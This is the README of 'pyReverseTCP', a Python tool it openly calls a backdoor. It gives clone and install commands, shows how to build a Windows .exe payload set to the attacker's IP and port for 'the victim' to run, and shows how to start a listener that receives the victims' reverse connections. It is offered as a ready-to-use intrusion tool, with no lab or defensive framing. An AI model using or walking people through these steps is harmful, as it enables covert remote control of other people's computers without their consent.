# pyReverseTCP
### A backdoor program made entirely in python
## Installation
> Cloning this repo
```
$ git clone https://github.com/Astrol99/pyReverseTCP.git
```
> Install required dependencies
Use pip with provided requirements.txt with all dependencies listed
```
$ cd pyReverseTCP
$ pip install -r requirements.txt
```
## Getting Started
### Making payload
In order to make a connection between you and the victim, the victim must run the payload. But to do that, you must first make a .exe program. A script called payload_creator.py has made this step autonomous, but needs two parameters, the attacker's IP and PORT
> Usage
```
python payload_creator.py <ATTACKER IP> <ATTACKER PORT>
```
> Example
```
python payload_creator.py 192.168.1.10 1234
```
### Using listener
The multi_lister.py script is an interface that uses python sockets to interact with the payload. To use it, first make sure your victim has launched the payload.
Then go into your terminal and run the program with the following parameters (same as payload creator):
> Usage
```
python multi_listener.py <ATTACKER IP> <ATTACKER PORT>
```
Then the program will listen for connections on that ip and port and if the victim has launched the payload, a message such as
```
[CONN] Davids-PC <-> 192.168.0.10:7598 | Connected
```
will display. 
